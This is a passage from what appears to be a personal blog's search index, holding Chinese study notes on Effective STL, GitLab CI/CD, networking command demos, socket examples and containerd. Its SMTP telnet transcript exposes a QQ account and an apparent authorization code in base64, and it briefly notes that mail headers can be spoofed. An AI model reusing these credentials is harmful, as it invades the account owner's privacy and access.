禁止调用</p>\n<p>在设计层面上无意义，只是方便实现</p>\n<p>尽可能用复合而不是private继承</p>\n<p>空对象也有大小</p>\n</li>\n<li><p>？多重继承</p>\n<p>菱形继承 virtual继承</p>\n</li>\n</ol>\n<h2 id=\"模板与泛型编程\"><a href=\"#模板与泛型编程\" class=\"headerlink\" title=\"模板与泛型编程\"></a>模板与泛型编程</h2><p>41. </p>\n<p>42. </p>\n","categories":["cpp"]},{"title":"effective STL","url":"/2026/01/31/cpp/effectiveSTL/","content":"<h1 id=\"effective-STL\"><a href=\"#effective-STL\" class=\"headerlink\" title=\"effective STL\"></a>effective STL</h1><h2 id=\"容器\"><a href=\"#容器\" class=\"headerlink\" title=\"容器\"></a>容器</h2><ol>\n<li><p>选择容器</p>\n</li>\n<li><p>不同容器有不同的接口 没有办法编写独立于容器的代码</p>\n</li>\n<li><p>容器会默认拷贝，基类容器放入派生类会丢失信息（slicing） 解决方法是用指针</p>\n<p>可以用空容器加reserve方法即拿到空间又避免创建空对象</p>\n</li>\n<li><p>用<code>empty()</code>代替<code>size()==0</code> 因为empty保证了常数时间而size对于某些容器不一定</p>\n<p>对于list <code>splice</code>提供了常数时间的拼接 因此无法维护size是常数时间</p>\n</li>\n<li><p>对于区间操作，写法上避免的循环 更优雅，在效率上会优化</p>\n<p>区间构造、插入、删除、赋值</p>\n</li>\n<li><p>编译器在分析时可能会把对象实例化分析成函数声明</p>\n</li>\n<li><p>使用new创建的对象需要在容器销毁前手动delete 最好的方法是用智能指针</p>\n</li>\n<li><p>不用auto_ptr</p>\n</li>\n<li><p>删除对象</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>某个值</th>\n<th>某些条件</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>vector string deque</td>\n<td>erase-remove</td>\n<td>erase-remove_if</td>\n</tr>\n<tr>\n<td>list</td>\n<td>remove</td>\n<td>remove_if</td>\n</tr>\n<tr>\n<td>set map</td>\n<td>erase</td>\n<td>遍历删除</td>\n</tr>\n</tbody></table>\n<p>循环删除：迭代器+erase</p>\n<ul>\n<li>序列容器：用返回值更新迭代器</li>\n<li>关联容器：迭代器后缀自增</li>\n</ul>\n</li>\n<li><p>自定义allocater需要注意很多东西，例如接受的参数是T的个数，返回T*</p>\n</li>\n<li><p>自定义allocater的好处有 单线程时避免线程同步的开销、放入同一块堆等</p>\n</li>\n<li><p>STL容器并不能保证线程安全 需要自己加锁</p>\n</li>\n</ol>\n<h2 id=\"vector和string\"><a href=\"#vector和string\" class=\"headerlink\" title=\"vector和string\"></a>vector和string</h2><ol start=\"13\">\n<li><p>用vector&#x2F;string代替动态数组 避免delete的麻烦</p>\n<p>string某些实现会使用引用计数来优化，但多线程情况下会带来同步的额外开销</p>\n</li>\n<li><p>reserve避免不必要的重新分配空间</p>\n</li>\n<li><p>string的多种实现</p>\n</li>\n<li><p>兼容C API：</p>\n<p>vector： <code>&amp;v[0]</code> 或<code>&amp;*v.begin()</code> 迭代器不是指针</p>\n<p>string： <code>s.c_str()</code></p>\n</li>\n<li><p>删除元素后容器的最大容量并不改变，可以通过swap缩小</p>\n<p><code>vector&lt;T&gt;(v).swap(v)</code></p>\n</li>\n<li><p><code>vector&lt;bool&gt;</code>每个bool占一个二进制位（位域思想）不满足STL标准  []返回代理对象</p>\n<p>用<code>deque&lt;boo&gt;``bitset</code>替代</p>\n</li>\n</ol>\n<h2 id=\"关联容器\"><a href=\"#关联容器\" class=\"headerlink\" title=\"关联容器\"></a>关联容器</h2><ol start=\"19\">\n<li><p>相等是数据相等 等价是自己定义的函数 成员函数与stl非成员函数方法不同</p>\n</li>\n<li><p>存指针需要指定比较函数 否则根据十六进制比较</p>\n</li>\n<li><p>比较函数需要保证让相等的值返回false 否则</p>\n<p><code>!(a&lt;=b) &amp;&amp; !(b&lt;=a)</code> 在a&#x3D;b时会返回false</p>\n</li>\n<li><p>对于set 修改key(比较的部分)是很危险的</p>\n<p>解决方法：</p>\n<ul>\n<li>找到对应元素 复制 修改 删除旧 插入新</li>\n<li><code>const_cast&lt;T&amp;&gt;(*t).f()</code></li>\n</ul>\n</li>\n<li><p><code>vector</code>使用二分查找的复杂度与关联容器一致，而在存储上更省空间，关联容器基于二叉树，需要额外两个指针。</p>\n<p>因此vector可在每个page上放更多的对象，减少了page fault的次数 从而提高性能</p>\n</li>\n<li><p>[]会先插入（默认构造）再赋值 适合已经有元素的情况下使用</p>\n<p>insert会构造pair再析构 适合在无元素的情况下使用</p>\n</li>\n<li><p>非标准散列容器</p>\n</li>\n</ol>\n<h2 id=\"迭代器\"><a href=\"#迭代器\" class=\"headerlink\" title=\"迭代器\"></a>迭代器</h2><ol start=\"26\">\n<li><p>使用iterator而不是其他的 例如const_iterator</p>\n</li>\n<li><p><code>advance(v.begin(),distance&lt;constIter&gt;(v.begin(),ci))</code> const_iterator去掉const</p>\n</li>\n<li><p><code>reverse_iterator.base()</code>拿到iterator 插入删除时注意位置</p>\n</li>\n<li><pre><code class=\"c++\">ifstream inputFile(&quot;f.txt&quot;);\nstring fileData(\n    (istreambuf_iterator&lt;char&gt;(inputFile)),\n    istream_buf_iterator&lt;char&gt;()\n);\n</code></pre>\n</li>\n</ol>\n<h2 id=\"算法\"><a href=\"#算法\" class=\"headerlink\" title=\"算法\"></a>算法</h2><ol start=\"30\">\n<li><p><code>transform</code>对容器1的每个元素进行操作 结果放到容器2中</p>\n<p><code>transform(v.begin(),v.end(),back_inserter(res),f)</code></p>\n</li>\n<li><p>完全排序：sort stable_sort</p>\n<p>部分排序：partial_sort</p>\n<p>找最前n个 不用排序：nth_element</p>\n<p>满足条件的区分：partition stable_partition</p>\n</li>\n<li><p>remove没有办法真正删掉元素 只是改变了位置 </p>\n<p>remove返回的迭代器是新的逻辑结尾 需要作为erase的第一个参数使用</p>\n</li>\n<li><p>如果管理的是指针 使用remove unique会导致资源泄露</p>\n</li>\n<li><p>有些函数只有在传入排序区间的情况下才能保证性能</p>\n</li>\n<li><p>默认字符串比较是大小写敏感的  可通过mismatch和tolower自己写一个忽略大小写的</p>\n</li>\n<li><p>copy_if</p>\n</li>\n<li><p>count count_if max_element</p>\n<p>accumulate 自定义累加函数</p>\n<p>for_each</p>\n</li>\n</ol>\n<h2 id=\"函数\"><a href=\"#函数\" class=\"headerlink\" title=\"函数\"></a>函数</h2><ol start=\"38\">\n<li><p>STL用到的函数都是按值传递的，因此需要保证小巧和单态</p>\n</li>\n<li><p>判别式（predicate）：返回bool的函数</p>\n<p>纯函数：结果仅与参数与常数有关</p>\n<p>判别式必须是纯函数 因为判别式会在某些STL函数中被复制使用</p>\n</li>\n<li><p><code>not1``not2</code>等函数配接器可以作用在函数外，配合find_if等函数使用</p>\n<p>需要定义的函数继承<code>std::unary_function&lt;T,bool&gt;</code> 或套一层<code>ptr_fun</code></p>\n</li>\n<li><p>成员函数传给STL组件时使用<code>mem_fun</code> 可用于成员函数自测</p>\n</li>\n<li><p>让<code>less&lt;T&gt;</code>与operator&#x3D;含义相同</p>\n</li>\n</ol>\n<h2 id=\"在程序中使用STL\"><a href=\"#在程序中使用STL\" class=\"headerlink\" title=\"在程序中使用STL\"></a>在程序中使用STL</h2><ol start=\"43\">\n<li><p>用算法避免循环 例如insert find for_each</p>\n<ul>\n<li>循环需要保证迭代器有效</li>\n<li>算法实现者可以通过容器的实现细节提高遍历效率</li>\n<li>算法名称表明意图</li>\n</ul>\n</li>\n<li><p>选择容器的成员函数而不是普通的STL算法</p>\n<p>容器的成员函数是针对容器实现的  效率和正确性都有保证</p>\n</li>\n<li><p>查找：</p>\n<p>未排序：count 遍历所有 返回个数；find 找到第一个就返回迭代器  相等性</p>\n<p>排序：lower_bound upper_bound equal_range 等价性</p>\n<p>count &#x3D; equal_range + distance</p>\n</li>\n<li><p>STL组件传入函数对象而不是函数</p>\n<p>函数对象的()方法可以内联直接被编译器使用</p>\n<p>函数只能作为指针 每次都调用</p>\n</li>\n<li><p>使用STL算法会带来很多的嵌套调用 难以阅读 最好分步 但是仍不用循环</p>\n</li>\n<li><p>不同的平台可能会自动include某些头文件 因此为了方便移植 需要自己加</p>\n</li>\n<li><p>debug时可以用软件把很长的类型进行替换 方便看到核心的错误信息</p>\n</li>\n<li><p>站点</p>\n</li>\n</ol>\n<p>​    </p>\n<p>​    </p>\n<p>​    </p>\n<p>​    </p>\n<p>​    </p>\n","categories":["cpp"]},{"title":"CI/CD","url":"/2024/09/17/misc/CICD/","content":"<h1 id=\"CI-CD\"><a href=\"#CI-CD\" class=\"headerlink\" title=\"CI&#x2F;CD\"></a>CI&#x2F;CD</h1><h3 id=\"test\"><a href=\"#test\" class=\"headerlink\" title=\"test\"></a>test</h3><p><a href=\"https://jiuaidu.com/jianzhan/1046052/\">go 覆盖测试工具介绍 - 建站教程 (jiuaidu.com)</a></p>\n<p><code>go test ./...</code>可以测试目录下所有的test文件</p>\n<p><code>go test minik8s/pkg/kubelet/container</code> 测试指定包下的测试文件</p>\n<h3 id=\"gitlab-runner\"><a href=\"#gitlab-runner\" class=\"headerlink\" title=\"gitlab runner\"></a>gitlab runner</h3><h4 id=\"docker\"><a href=\"#docker\" class=\"headerlink\" title=\"docker\"></a>docker</h4><p><code>docker run -d --name gitlab-runner --restart always   -v /srv/gitlab-runner/config:/etc/gitlab-runner   -v /var/run/docker.sock:/var/run/docker.sock   gitlab/gitlab-runner:v15.10.1</code></p>\n<p>执行器选择docker 这里镜像需要先在主机上写Dockerfile手动构建好，然后修改<code>config.toml</code>配置文件把<code>pull_policy</code>修改为<code>if-not-present</code></p>\n<p>对于简单测试没问题，但是对于CNI这种复杂的东西，即使加了privilege&#x3D;true，还是会出现和宿主机上不一样的情况。</p>\n<h4 id=\"host\"><a href=\"#host\" class=\"headerlink\" title=\"host\"></a>host</h4><p><a href=\"https://docs.gitlab.com/runner/install/\">Install GitLab Runner | GitLab</a></p>\n<p>交大云主机安装二进制</p>\n<p><code>nslookup www.ipads.sjtu.edu.cn</code> 安全组开放所有端口</p>\n<p><code>gitlab-runner register</code> 去gitlab网页的settings&#x2F;cicd复制url和token</p>\n<p>执行器选择shell 在主机上给gitlab-runner用户足够的权限</p>\n<p><a href=\"https://blog.csdn.net/qq_39940674/article/details/127616784\">【汇总】解决GitLab-Runner执行脚本命令无权限_gitlab-runner 提升权限_成为大佬先秃头的博客-CSDN博客</a></p>\n<p>采用这种方法进行CI&#x2F;CD，gitlab-runner会在主机上的某个目录跑脚本，用的都是主机的环境</p>\n<ul>\n<li>优点：不需要手动配一个拥有所有环境的镜像；没有容器导致的与主机不一致，跑不起来的情况。</li>\n<li>缺点：会对主机产生影响；在缺少依赖的情况下无法更换gitlab-runner所在主机。</li>\n</ul>\n<h3 id=\"gitlab-ci-yml\"><a href=\"#gitlab-ci-yml\" class=\"headerlink\" title=\".gitlab-ci.yml\"></a>.gitlab-ci.yml</h3><ol>\n<li><p>prepare: 设置go env，防止go test在download时超时</p>\n</li>\n<li><p>test：<code>go test</code> 如果测试涉及到的api需要权限，需要加sudo</p>\n<p>创建多个tag为shell的runner，使test阶段并行测试 （目前一共3个）</p>\n<p>需要修改手动<code>/etc/gitlab-runner/config.toml</code>的concurrent为3</p>\n</li>\n<li><p>build：<code>go build</code> 生成可执行文件在<code>/home/gitlab-runner/$CI_COMMIT_BRANCH/</code>目录下</p>\n<p>不同分支build出的文件不会互相覆盖</p>\n</li>\n</ol>\n<h3 id=\"代码同步\"><a href=\"#代码同步\" class=\"headerlink\" title=\"代码同步\"></a>代码同步</h3><p>同时推送到gitee和gitlab，不然无法用gitlab-runner</p>\n<p><a href=\"https://www.cnblogs.com/hmy-666/p/17304317.html\">git push origin master一次提交多个远程仓库 - 兜里还剩五块出头 - 博客园 (cnblogs.com)</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@minik8s-1:/mini-k8s# git remote -v</span><br><span class=\"line\">origin  https://gitee.com/szy_0127/mini-k8s.git (fetch)</span><br><span class=\"line\">origin  https://gitee.com/szy_0127/mini-k8s.git (push)</span><br><span class=\"line\">origin  https://ipads.se.sjtu.edu.cn:2020/520021910933/minik8s.git (push)</span><br></pre></td></tr></table></figure>\n\n","categories":["misc"]},{"title":"Network","url":"/2026/01/31/misc/network/","content":"<h1 id=\"Network\"><a href=\"#Network\" class=\"headerlink\" title=\"Network\"></a>Network</h1><h2 id=\"路由器\"><a href=\"#路由器\" class=\"headerlink\" title=\"路由器\"></a>路由器</h2><p>tracert 查看到目标主机经过的所有路由器及延迟</p>\n<p>第n行表示第n个经过的路由器 每个测试3次</p>\n<p>3n个测试每个都是独立的</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"code\"><pre><span class=\"line\">tracert i.sjtu.edu.cn</span><br><span class=\"line\">通过最多 <span class=\"number\">30</span> 个跃点跟踪</span><br><span class=\"line\">到 i.sjtu.edu.cn [<span class=\"number\">202.120</span><span class=\"type\">.35.189</span>] 的路由:</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"number\">1</span>     <span class=\"number\">1</span> ms     <span class=\"number\">1</span> ms     <span class=\"number\">1</span> ms  <span class=\"number\">192.168</span>.<span class=\"number\">1.1</span></span><br><span class=\"line\">  <span class=\"number\">2</span>    <span class=\"number\">11</span> ms    <span class=\"number\">11</span> ms     <span class=\"number\">4</span> ms  <span class=\"number\">100.119</span>.<span class=\"number\">0.1</span></span><br><span class=\"line\">  <span class=\"number\">3</span>     *        <span class=\"number\">4</span> ms     <span class=\"number\">3</span> ms  . [<span class=\"number\">117.135</span><span class=\"type\">.51.33</span>]</span><br><span class=\"line\">  <span class=\"number\">4</span>     <span class=\"number\">4</span> ms     <span class=\"number\">3</span> ms     <span class=\"number\">3</span> ms  <span class=\"number\">221.183</span>.<span class=\"number\">53.229</span></span><br><span class=\"line\">  <span class=\"number\">5</span>     <span class=\"number\">5</span> ms     *        *     <span class=\"number\">221.183</span>.<span class=\"number\">90.242</span></span><br><span class=\"line\">  <span class=\"number\">6</span>     <span class=\"number\">6</span> ms     <span class=\"number\">6</span> ms     <span class=\"number\">6</span> ms  <span class=\"number\">221.176</span>.<span class=\"number\">23.98</span></span><br><span class=\"line\">  <span class=\"number\">7</span>     <span class=\"number\">7</span> ms     <span class=\"number\">7</span> ms     <span class=\"number\">6</span> ms  <span class=\"number\">101.4</span>.<span class=\"number\">118.114</span></span><br><span class=\"line\">  <span class=\"number\">8</span>     *        *        *     请求超时。</span><br><span class=\"line\">  <span class=\"number\">9</span>     <span class=\"number\">6</span> ms     <span class=\"number\">5</span> ms     <span class=\"number\">5</span> ms  <span class=\"number\">202.112</span>.<span class=\"number\">27.14</span></span><br><span class=\"line\"> <span class=\"number\">10</span>     <span class=\"number\">6</span> ms     <span class=\"number\">6</span> ms     <span class=\"number\">5</span> ms  LAPTOP<span class=\"literal\">-DFL6S3EU</span> [<span class=\"number\">10.255</span><span class=\"type\">.38.253</span>]</span><br><span class=\"line\"> <span class=\"number\">11</span>     <span class=\"number\">7</span> ms     <span class=\"number\">6</span> ms     <span class=\"number\">6</span> ms  LAPTOP<span class=\"literal\">-DFL6S3EU</span> [<span class=\"number\">10.255</span><span class=\"type\">.38.2</span>]</span><br><span class=\"line\"> <span class=\"number\">12</span>     <span class=\"number\">8</span> ms    <span class=\"number\">13</span> ms    <span class=\"number\">11</span> ms  LAPTOP<span class=\"literal\">-DFL6S3EU</span> [<span class=\"number\">10.255</span><span class=\"type\">.38.57</span>]</span><br><span class=\"line\"> <span class=\"number\">13</span>     *        *        *     请求超时。</span><br><span class=\"line\"> <span class=\"number\">14</span>     *        *        *     请求超时。</span><br><span class=\"line\"> <span class=\"number\">15</span>     <span class=\"number\">6</span> ms     <span class=\"number\">6</span> ms     <span class=\"number\">6</span> ms  <span class=\"number\">202.120</span>.<span class=\"number\">35.189</span></span><br><span class=\"line\"></span><br><span class=\"line\">跟踪完成。</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"HTTP\"><a href=\"#HTTP\" class=\"headerlink\" title=\"HTTP\"></a>HTTP</h2><p>telnet 在指定端口打开TCP连接</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"code\"><pre><span class=\"line\">linux@LAPTOP<span class=\"literal\">-DFL6S3EU</span>:<span class=\"variable\">$</span> telnet <span class=\"number\">119.3</span>.<span class=\"number\">127.254</span> <span class=\"number\">8080</span></span><br><span class=\"line\">Trying <span class=\"number\">119.3</span>.<span class=\"number\">127.254</span>...</span><br><span class=\"line\">Connected to <span class=\"number\">119.3</span>.<span class=\"number\">127.254</span>.</span><br><span class=\"line\">Escape character is <span class=\"string\">&#x27;^]&#x27;</span>.</span><br><span class=\"line\">GET /checkSession HTTP/<span class=\"number\">1.1</span></span><br><span class=\"line\">Host: <span class=\"number\">119.3</span>.<span class=\"number\">127.254</span></span><br><span class=\"line\"></span><br><span class=\"line\">HTTP/<span class=\"number\">1.1</span> <span class=\"number\">200</span></span><br><span class=\"line\">Vary: Origin</span><br><span class=\"line\">Vary: Access<span class=\"literal\">-Control-Request-Method</span></span><br><span class=\"line\">Vary: Access<span class=\"literal\">-Control-Request-Headers</span></span><br><span class=\"line\">Content<span class=\"literal\">-Type</span>: application/json</span><br><span class=\"line\">Transfer<span class=\"literal\">-Encoding</span>: chunked</span><br><span class=\"line\">Date: Thu, <span class=\"number\">11</span> Aug <span class=\"number\">2022</span> <span class=\"number\">06</span>:<span class=\"number\">42</span>:<span class=\"number\">13</span> GMT</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">47</span></span><br><span class=\"line\">&#123;<span class=\"string\">&quot;success&quot;</span>:false,<span class=\"string\">&quot;msg&quot;</span>:<span class=\"string\">&quot;登录失效，请重新登录！&quot;</span>,<span class=\"string\">&quot;data&quot;</span>:null&#125;</span><br><span class=\"line\"><span class=\"number\">0</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"SMTP\"><a href=\"#SMTP\" class=\"headerlink\" title=\"SMTP\"></a>SMTP</h2><p>不同的mail server有不同的登录方式 </p>\n<p>对于qq邮箱 需要拿到授权码 和qq号分别base64加密 auth login登录</p>\n<p>data后可以通过from to 指定虚假的收件人 发件人</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"code\"><pre><span class=\"line\">linux@LAPTOP<span class=\"literal\">-DFL6S3EU</span>:/mnt/e/books/cs<span class=\"literal\">-computer-networking</span><span class=\"variable\">$</span> telnet smtp.qq.com <span class=\"number\">25</span></span><br><span class=\"line\">Trying <span class=\"number\">2408</span>:<span class=\"number\">8756</span>:<span class=\"number\">2</span>cf2:<span class=\"number\">19</span>::<span class=\"number\">11</span>...</span><br><span class=\"line\">Connected to smtp.qq.com.</span><br><span class=\"line\">Escape character is <span class=\"string\">&#x27;^]&#x27;</span>.</span><br><span class=\"line\"><span class=\"number\">220</span> newxmesmtplogicsvrsza31.qq.com XMail Esmtp QQ Mail Server.</span><br><span class=\"line\">helo jjj</span><br><span class=\"line\"><span class=\"number\">250</span><span class=\"literal\">-newxmesmtplogicsvrsza31</span>.qq.com<span class=\"literal\">-11</span>.<span class=\"number\">149.66</span>.<span class=\"number\">240</span><span class=\"literal\">-71806244</span></span><br><span class=\"line\"><span class=\"number\">250</span><span class=\"literal\">-SIZE</span> <span class=\"number\">73400320</span></span><br><span class=\"line\"><span class=\"number\">250</span> OK</span><br><span class=\"line\">auth login</span><br><span class=\"line\"><span class=\"number\">334</span> VXNlcm5hbWU6</span><br><span class=\"line\">MTc5OTg1MzUyMw==</span><br><span class=\"line\"><span class=\"number\">334</span> UGFzc3dvcmQ6</span><br><span class=\"line\">YWNiaHd4dmJ5anN6ZWZmYg==</span><br><span class=\"line\"><span class=\"number\">235</span> Authentication successful</span><br><span class=\"line\">mail from: &lt;<span class=\"number\">1799853523</span>@qq.com&gt;</span><br><span class=\"line\"><span class=\"number\">250</span> OK</span><br><span class=\"line\">rcpt to: &lt;<span class=\"number\">734595697</span>@qq.com&gt;</span><br><span class=\"line\"><span class=\"number\">250</span> OK</span><br><span class=\"line\"><span class=\"keyword\">data</span></span><br><span class=\"line\"><span class=\"number\">354</span> <span class=\"keyword\">End</span> <span class=\"keyword\">data</span> with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;.</span><br><span class=\"line\">subject: hello</span><br><span class=\"line\">hello</span><br><span class=\"line\"></span><br><span class=\"line\">.</span><br><span class=\"line\"><span class=\"number\">250</span> OK: queued as.</span><br><span class=\"line\">quit</span><br><span class=\"line\"><span class=\"number\">221</span> Bye.</span><br><span class=\"line\">Connection closed by foreign host.</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"DNS\"><a href=\"#DNS\" class=\"headerlink\" title=\"DNS\"></a>DNS</h2><p>DNS也算protocal 可在wireshark中捕捉到</p>\n<p>nslookup</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;nslookup i.sjtu.edu.cn</span><br><span class=\"line\">服务器:  UnKnown</span><br><span class=\"line\">Address:  fe80::<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">非权威应答:</span><br><span class=\"line\">名称:    i.sjtu.edu.cn</span><br><span class=\"line\">Address:  <span class=\"number\">202.120</span>.<span class=\"number\">35.189</span></span><br><span class=\"line\"></span><br><span class=\"line\">&gt;nslookup <span class=\"literal\">-type</span>=NS sjtu.edu.cn</span><br><span class=\"line\">服务器:  UnKnown</span><br><span class=\"line\">Address:  fe80::<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">非权威应答:</span><br><span class=\"line\">sjtu.edu.cn     nameserver = apple.sjtu.edu.cn</span><br><span class=\"line\">sjtu.edu.cn     nameserver = dns.sjtu.edu.cn</span><br><span class=\"line\"></span><br><span class=\"line\">&gt;nslookup i.sjtu.edu.cn apple.sjtu.edu.cn</span><br><span class=\"line\">服务器:  UnKnown</span><br><span class=\"line\">Address:  <span class=\"number\">202.112</span>.<span class=\"number\">26.43</span></span><br><span class=\"line\"></span><br><span class=\"line\">名称:    i.sjtu.edu.cn</span><br><span class=\"line\">Address:  <span class=\"number\">202.120</span>.<span class=\"number\">35.189</span></span><br></pre></td></tr></table></figure>\n\n<p>ipconfig</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Users\\Shen&gt;ipconfig /flushdns</span><br><span class=\"line\"></span><br><span class=\"line\">Windows IP 配置</span><br><span class=\"line\"></span><br><span class=\"line\">已成功刷新 DNS 解析缓存。</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Users\\Shen&gt;ipconfig /displaydns</span><br><span class=\"line\"></span><br><span class=\"line\">Windows IP 配置</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"number\">153.109</span>.<span class=\"number\">199.185</span>.in<span class=\"literal\">-addr</span>.arpa</span><br><span class=\"line\">    <span class=\"literal\">----------------------------------------</span></span><br><span class=\"line\">    记录名称. . . . . . . : <span class=\"number\">153.109</span>.<span class=\"number\">199.185</span>.in<span class=\"literal\">-addr</span>.arpa.</span><br><span class=\"line\">    记录类型. . . . . . . : <span class=\"number\">12</span></span><br><span class=\"line\">    生存时间. . . . . . . : <span class=\"number\">516448</span></span><br><span class=\"line\">    数据长度. . . . . . . : <span class=\"number\">8</span></span><br><span class=\"line\">    部分. . . . . . . . . : 答案</span><br><span class=\"line\">    PTR 记录  . . . . . . : github.github.io</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"UDP\"><a href=\"#UDP\" class=\"headerlink\" title=\"UDP\"></a>UDP</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#client.py</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> socket <span class=\"keyword\">import</span> *</span><br><span class=\"line\">serverName = <span class=\"string\">&#x27;localhost&#x27;</span></span><br><span class=\"line\">serverPort = <span class=\"number\">12000</span></span><br><span class=\"line\">clientSocket = socket(AF_INET, SOCK_DGRAM)</span><br><span class=\"line\">message = <span class=\"built_in\">input</span>(<span class=\"string\">&quot;Input lowercase sentence:&quot;</span>)</span><br><span class=\"line\">clientSocket.sendto(message.encode(),(serverName, serverPort))</span><br><span class=\"line\">modifiedMessage, serverAddress = clientSocket.recvfrom(<span class=\"number\">2048</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(modifiedMessage.decode())</span><br><span class=\"line\">clientSocket.close()</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#server.py</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> socket <span class=\"keyword\">import</span> *</span><br><span class=\"line\">serverPort = <span class=\"number\">12000</span></span><br><span class=\"line\">serverSocket = socket(AF_INET, SOCK_DGRAM)</span><br><span class=\"line\">serverSocket.bind((<span class=\"string\">&#x27;&#x27;</span>, serverPort))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;The server is ready to receive&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    message, clientAddress = serverSocket.recvfrom(<span class=\"number\">2048</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(clientAddress)</span><br><span class=\"line\">    modifiedMessage = message.decode().upper()</span><br><span class=\"line\">    serverSocket.sendto(modifiedMessage.encode(), </span><br><span class=\"line\">clientAddress)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"TCP\"><a href=\"#TCP\" class=\"headerlink\" title=\"TCP\"></a>TCP</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#client.py</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> socket <span class=\"keyword\">import</span> *</span><br><span class=\"line\">serverName = <span class=\"string\">&#x27;localhost&#x27;</span></span><br><span class=\"line\">serverPort = <span class=\"number\">12000</span></span><br><span class=\"line\">clientSocket = socket(AF_INET, SOCK_STREAM)</span><br><span class=\"line\">clientSocket.connect((serverName,serverPort))</span><br><span class=\"line\">sentence = <span class=\"built_in\">input</span>(<span class=\"string\">&quot;Input lowercase sentence:&quot;</span>)</span><br><span class=\"line\">clientSocket.send(sentence.encode())</span><br><span class=\"line\">modifiedSentence = clientSocket.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(’From Server: ’, modifiedSentence.decode()) </span><br><span class=\"line\">clientSocket.close()</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#server.py</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> socket <span class=\"keyword\">import</span> *</span><br><span class=\"line\">serverPort = <span class=\"number\">12000</span></span><br><span class=\"line\">serverSocket = socket(AF_INET,SOCK_STREAM)</span><br><span class=\"line\">serverSocket.bind((<span class=\"string\">&#x27;&#x27;</span>,serverPort))</span><br><span class=\"line\">serverSocket.listen(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;The server is ready to receive&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    connectionSocket, addr = serverSocket.accept()</span><br><span class=\"line\">    sentence = connectionSocket.recv(<span class=\"number\">1024</span>).decode()</span><br><span class=\"line\">    capitalizedSentence = sentence.upper()</span><br><span class=\"line\">    connectionSocket.send(capitalizedSentence.encode()) </span><br><span class=\"line\">    connectionSocket.close()</span><br></pre></td></tr></table></figure>\n\n\n\n","categories":["misc"]},{"title":"kubelet","url":"/2024/09/17/misc/kubelet/","content":"<h1 id=\"kubelet\"><a href=\"#kubelet\" class=\"headerlink\" title=\"kubelet\"></a>kubelet</h1><h2 id=\"containerd\"><a href=\"#containerd\" class=\"headerlink\" title=\"containerd\"></a>containerd</h2><p><a href=\"https://github.com/containerd/containerd/blob/main/docs/getting-started.md\">containerd&#x2F;getting-started.md at main · containerd&#x2F;containerd (github.com)</a></p>\n<p>镜像自带，但需要安装cni，高版本没有自带的flannel，用0.9.1版本可以</p>\n<h3 id=\"management\"><a href=\"#management\" class=\"headerlink\" title=\"management\"></a>management</h3><p>管理容器，考虑以下三种方法：</p>\n<ol>\n<li><p>containerd启动时会作为grpc server，监听在<code>unix:///run/containerd/containerd.sock</code> 可以像k8s一样作为grpc client调定义好的CRI接口。但是我们不需要考虑项目不同模块解耦，也不需要考虑支持其他的容器运行时，对于grpc的调用需要自己构造参数，太复杂，并且试了一下很难跑起来。</p>\n</li>\n<li><p>用exec+ctl</p>\n<p>这里可以使用containerd写的nerdctl 兼容docker的命令行格式</p>\n<p><a href=\"https://github.com/containerd/nerdctl\">containerd&#x2F;nerdctl: contaiNERD CTL - Docker-compatible CLI for containerd, with support for Compose, Rootless, eStargz, OCIcrypt, IPFS, … (github.com)</a></p>\n<p>完全用cli工具技术含量不高，且需要经过nerdctl这个大框架的解析，效率不高。</p>\n<p>可以做一些辅助用途，比如测试、启动pause等。核心的查看容器状态和启动容器还是用containerd的go api</p>\n</li>\n<li><p>containerd api</p>\n<p>实在难用，官方文档一共就readme的几句话，剩下的全靠看源码+猜+看nerdctl源码如何使用</p>\n</li>\n</ol>\n<p>这里研究出的api如下</p>\n<ul>\n<li>创建容器 包括配置</li>\n<li>销毁容器</li>\n<li>获取容器状态</li>\n<li>获取容器资源信息</li>\n</ul>\n<h3 id=\"configuration\"><a href=\"#configuration\" class=\"headerlink\" title=\"configuration\"></a>configuration</h3><ul>\n<li><p><code>WithMounts</code> 挂载 需要将type和options同时设为bind，否则会报<code>no such 